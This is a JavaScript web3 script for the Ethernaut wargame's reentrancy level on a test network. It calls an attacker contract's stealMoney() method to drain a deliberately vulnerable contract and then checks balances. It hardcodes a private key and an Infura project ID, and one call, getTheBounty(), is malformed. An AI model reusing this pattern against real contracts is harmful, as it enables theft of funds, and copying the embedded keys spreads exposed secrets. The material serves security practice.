import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ReentranceSol.json')));
// const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Reentrance.json')));
const address = '0x2F493EEa60Dcec0521157C08a9298fcA1C3DC350';
const solAddress = solArtifact.networks['3'].address;
debugEthernaut('solAddress', solAddress);
const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
// const contract = new web3.eth.Contract(artifact.abi, address);

const ethernaut = async () => {
  try {
    const estimatedGas = await solContract.methods.stealMoney().estimateGas();
    debugEthernaut('estimated gas', estimatedGas);
    const transactionData = await solContract.methods.stealMoney().encodeABI();
    debugEthernaut('data', transactionData);
    const transaction = {
      from: account.address,
      to: solAddress,
      data: transactionData,
      gasLimit: estimatedGas * 100,
      // gasPrice: web3.utils.toWei('20', 'Gwei'),
    };

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);

    // Retrieve money
    const currentBalance = await web3.eth.getBalance(account.address);
    debugEthernaut('currentBalance', web3.utils.fromWei(currentBalance));
    await solContract.getTheBounty();
    const newBalance = await web3.eth.getBalance(account.address);
    debugEthernaut('newBalance', web3.utils.fromWei(newBalance));

    // Check result
    const contractFinalBalance = await web3.eth.getBalance(address);
    debugEthernaut('contractFinalBalance', contractFinalBalance);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
